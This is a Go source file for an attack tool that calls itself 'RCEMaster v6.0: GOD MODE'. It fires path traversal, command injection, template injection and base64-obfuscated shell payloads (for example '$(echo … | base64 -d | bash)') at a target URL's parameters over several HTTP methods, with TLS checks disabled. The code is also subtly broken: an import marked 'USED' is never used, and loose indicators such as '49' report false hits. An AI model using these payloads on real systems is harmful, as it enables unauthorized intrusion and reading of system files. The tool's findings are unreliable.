package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64" // ✅ USED
	"encoding/hex"    // ✅ USED
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart" // ✅ USED
	"net/http"
	"net/url"
	"os"
	"regexp"         // ✅ USED
	"strings"
	"sync"           // ✅ USED
	"time"

	"github.com/fatih/color"
)

var banner = "  ____  _____ _____    __  __           _      \n" +
	" |  _ \\| ____|_   _|  |  \\/  | __ _ _ __ | |_ ___\n" +
	" | |_) |  _|   | |    | |\\/| |/ _` | '_ \\| __/ _ \\\n" +
	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
	" |_| \\_\\_____| |_|    |_|  |_|\\__,_|_| |_|\\__\\___|\n" +
	"====================================================\n" +
	" [!] RCEMaster v6.0: GOD MODE\n" +
	" [!] Smart Parameter Injection | Curl-Like Deep Analysis\n" +
	" [!] Multi-Method Parallel Execution | Ultimate Payloads\n" +
	"====================================================\n"

var (
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	red    = color.New(color.FgRed).SprintFunc()
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"curl/8.4.0", // ✅ Curl-like UA added
}

func getRandomUA() string { return userAgents[rand.Intn(len(userAgents))] }

type TechStack struct{ Language, Framework, CMS, Server, WAF string }
type Result struct{ URL, Method, Vector, Payload, Evidence, Confidence string; StatusCode int }
type ResponseInfo struct{ StatusCode int; Body string; Headers http.Header }

// --- ULTIMATE PAYLOAD DATABASES ---
var lfiPathTraversal = []string{
	"../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
	"....//....//....//etc/passwd", "/etc/passwd",
	"../../../../Windows/win.ini", "..\\..\\..\\..\\Windows\\win.ini",
	"php://filter/convert.base64-encode/resource=index.php",
}

var cmdInjection = []string{
	";id", "|id", "&&id", "||id", "`id`", "$(id)",
	";cat /etc/passwd", "|cat /etc/passwd",
	";whoami", "|whoami", "%0Aid", "%0Did",
}

var sstiPayloads = []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"}

var httpMethods = []string{"GET", "POST", "PUT", "DELETE", "PATCH"}

func init() { rand.Seed(time.Now().UnixNano()) }

func main() {
	urlPtr := flag.String("u", "", "Target URL")
	outputPtr := flag.String("o", "", "Output file")
	delayPtr := flag.Duration("delay", 0, "Delay")
	proxyPtr := flag.String("proxy", "", "Proxy URL")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Printf("%s Usage: rcemaster -u <url>\n", red("[-] Error: URL required."))
		os.Exit(1)
	}

	fmt.Print(cyan(banner))
	fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(*urlPtr))

	// Phase 1: Curl-like Deep Recon
	fmt.Printf("%s Phase 1: Deep Recon & Parameter Mapping...\n", cyan("[*]"))
	techStack, hasParams := deepRecon(*urlPtr, *delayPtr, *proxyPtr)
	fmt.Printf("%s Detected: %s %s | WAF: %s | Params Found: %v\n", green("[+]"), techStack.Language, techStack.CMS, techStack.WAF, hasParams)

	// Phase 2: God Mode Attack
	fmt.Printf("%s Phase 2: Starting Multi-Method Parallel Attack...\n", cyan("[*]"))
	results := godModeAttack(*urlPtr, techStack, hasParams, *delayPtr, *proxyPtr)

	if len(results) > 0 {
		fmt.Println("\n" + cyan("========== 🎯 RCE / LFI SUCCESSFUL 🎯 =========="))
		for _, r := range results {
			fmt.Printf("[%s] %s (%s)\n", green("HIT"), r.URL, r.Method)
			fmt.Printf("   -> Vector  : %s\n", yellow(r.Vector))
			fmt.Printf("   -> Payload : %s\n", cyan(r.Payload))
			fmt.Printf("   -> Evidence: %s\n\n", r.Evidence)
		}
		fmt.Println(cyan("===================================================="))
	} else {
		fmt.Printf("\n%s No vulnerabilities found. Target is secure or requires manual advanced chaining.\n", yellow("[-]"))
	}

	if *outputPtr != "" && len(results) > 0 {
		saveToFile(results, *outputPtr)
		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
	}
}

func deepRecon(targetURL string, delay time.Duration, proxyURL string) (TechStack, bool) {
	stack := TechStack{}
	hasParams := false

	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}

	req, _ := http.NewRequest("GET", targetURL, nil)
	req.Header.Set("User-Agent", getRandomUA())
	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
		server := strings.ToLower(resp.Header.Get("Server"))
		xPoweredBy := strings.ToLower(resp.Header.Get("X-Powered-By"))
		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
		body := strings.ToLower(string(bodyBytes))

		if strings.Contains(server, "php") || strings.Contains(xPoweredBy, "php") { stack.Language = "php" }
		if strings.Contains(server, "tomcat") || strings.Contains(xPoweredBy, "jsp") || strings.Contains(server, "java") { stack.Language = "java" }
		if strings.Contains(body, "jsp") { stack.Language = "java" }
		if resp.Header.Get("Cf-Ray") != "" { stack.WAF = "cloudflare" }

		// Check for parameters
		parsed, _ := url.Parse(targetURL)
		if len(parsed.Query()) > 0 {
			hasParams = true
		}
	}
	return stack, hasParams
}

func godModeAttack(targetURL string, stack TechStack, hasParams bool, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	parsed, _ := url.Parse(targetURL)
	baseURL := parsed.Scheme + "://" + parsed.Host + parsed.Path
	queryParams := parsed.Query()

	// 1. SMART PARAMETER INJECTION (The Game Changer)
	if hasParams {
		fmt.Printf("%s Injecting payloads into discovered parameters...\n", cyan("[*]"))
		for key := range queryParams {
			// Test LFI/Path Traversal
			for _, payload := range lfiPathTraversal {
				for _, method := range httpMethods {
					wg.Add(1)
					go func(k, p, m string) {
						defer wg.Done()
						testParams := url.Values{}
						for kOrig, vOrig := range queryParams {
							if kOrig == k {
								testParams.Set(kOrig, p) // Inject payload
							} else {
								testParams[kOrig] = vOrig
							}
						}
						testURL := baseURL + "?" + testParams.Encode()
						info := sendCurlLikeRequest(testURL, m, nil, nil, delay, proxyURL)
						if isVulnerable(info, p) {
							mu.Lock()
							results = append(results, Result{URL: testURL, Method: m, Vector: "LFI / Path Traversal", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
							mu.Unlock()
						}
					}(key, payload, method)
				}
			}

			// Test Command Injection
			for _, payload := range cmdInjection {
				for _, method := range httpMethods {
					wg.Add(1)
					go func(k, p, m string) {
						defer wg.Done()
						testParams := url.Values{}
						for kOrig, vOrig := range queryParams {
							if kOrig == k {
								testParams.Set(kOrig, vOrig[0]+p) // Append to existing value
							} else {
								testParams[kOrig] = vOrig
							}
						}
						testURL := baseURL + "?" + testParams.Encode()
						info := sendCurlLikeRequest(testURL, m, nil, nil, delay, proxyURL)
						if isVulnerable(info, p) {
							mu.Lock()
							results = append(results, Result{URL: testURL, Method: m, Vector: "Command Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
							mu.Unlock()
						}
					}(key, payload, method)
				}
			}

			// Test SSTI
			for _, payload := range sstiPayloads {
				for _, method := range httpMethods {
					wg.Add(1)
					go func(k, p, m string) {
						defer wg.Done()
						testParams := url.Values{}
						for kOrig, vOrig := range queryParams {
							if kOrig == k {
								testParams.Set(kOrig, p)
							} else {
								testParams[kOrig] = vOrig
							}
						}
						testURL := baseURL + "?" + testParams.Encode()
						info := sendCurlLikeRequest(testURL, m, nil, nil, delay, proxyURL)
						if isVulnerable(info, p) {
							mu.Lock()
							results = append(results, Result{URL: testURL, Method: m, Vector: "SSTI", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
							mu.Unlock()
						}
					}(key, payload, method)
				}
			}
		}
	}

	// 2. FALLBACK: URL Path Injection (If no params or params fail)
	if !hasParams || len(results) == 0 {
		fmt.Printf("%s Fallback: Testing URL Path & Advanced Obfuscation...\n", cyan("[*]"))
		for _, payload := range cmdInjection {
			for _, method := range httpMethods {
				wg.Add(1)
				go func(p, m string) {
					defer wg.Done()
					info := sendCurlLikeRequest(targetURL+p, m, nil, nil, delay, proxyURL)
					if isVulnerable(info, p) {
						mu.Lock()
						results = append(results, Result{URL: targetURL + p, Method: m, Vector: "Path Cmd Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "Medium"})
						mu.Unlock()
					}
				}(payload, method)
			}
		}
		
		// Advanced Obfuscation Fallback
		for _, cmd := range []string{"id", "whoami"} {
			wg.Add(1)
			go func(c string) {
				defer wg.Done()
				for _, obs := range obfuscatePayload(c) {
					info := sendCurlLikeRequest(targetURL+obs, "GET", nil, nil, delay, proxyURL)
					if isVulnerable(info, c) {
						mu.Lock()
						results = append(results, Result{URL: targetURL + obs, Method: "GET", Vector: "Advanced Obfuscation", Payload: obs, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
						mu.Unlock()
					}
				}
			}(cmd)
		}
	}

	wg.Wait()
	return results
}

// --- CURL-LIKE DEEP REQUEST ENGINE ---
func sendCurlLikeRequest(targetURL, method string, customHeaders map[string]string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
	if delay > 0 { time.Sleep(delay) }

	var req *http.Request
	var err error
	if body != nil {
		req, err = http.NewRequest(method, targetURL, bytes.NewReader(body))
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}
	if err != nil { return ResponseInfo{} }

	// Curl-like headers
	req.Header.Set("User-Agent", getRandomUA())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	for k, v := range customHeaders { req.Header.Set(k, v) }

	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	if proxyURL != "" {
		proxyParsed, _ := url.Parse(proxyURL)
		transport.Proxy = http.ProxyURL(proxyParsed)
	}

	client := &http.Client{Timeout: 15 * time.Second, Transport: transport, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := client.Do(req)
	if err != nil { return ResponseInfo{} }
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
	return ResponseInfo{StatusCode: resp.StatusCode, Body: string(respBody), Headers: resp.Header}
}

func isVulnerable(info ResponseInfo, payload string) bool {
	indicators := []string{"root:", "bin/bash", "bin/sh", "uid=", "49", "Windows", "win.ini", "drwx", "total "}
	body := strings.ToLower(info.Body)
	for _, ind := range indicators {
		if strings.Contains(body, strings.ToLower(ind)) { return true }
	}
	return false
}

func extractEvidence(body string) string {
	re := regexp.MustCompile(`(?i)(root:.*|bin/bash|bin/sh|uid=\d+.*|49|win\.ini|drwx|total\s+\d+)`) // ✅ regexp USED
	match := re.FindString(body)
	if match != "" {
		if len(match) > 80 { return match[:80] + "..." }
		return match
	}
	return "Vulnerability indicator detected in response body"
}

func obfuscatePayload(cmd string) []string {
	var payloads []string
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(cmd)) // ✅ base64 USED
	payloads = append(payloads, fmt.Sprintf("$(echo %s | base64 -d | bash)", b64Cmd))
	
	hexCmd := hex.EncodeToString([]byte(cmd)) // ✅ hex USED
	if len(hexCmd) >= 4 {
		payloads = append(payloads, fmt.Sprintf("$(printf '\\x%s\\x%s' | sh)", hexCmd[0:2], hexCmd[2:4]))
	}
	payloads = append(payloads, fmt.Sprintf("cat${IFS}/etc/passwd"))
	return payloads
}

func saveToFile(results []Result, filename string) {
	file, _ := os.Create(filename)
	defer file.Close()
	jsonData, _ := json.MarshalIndent(results, "", "  ")
	file.Write(jsonData)
}
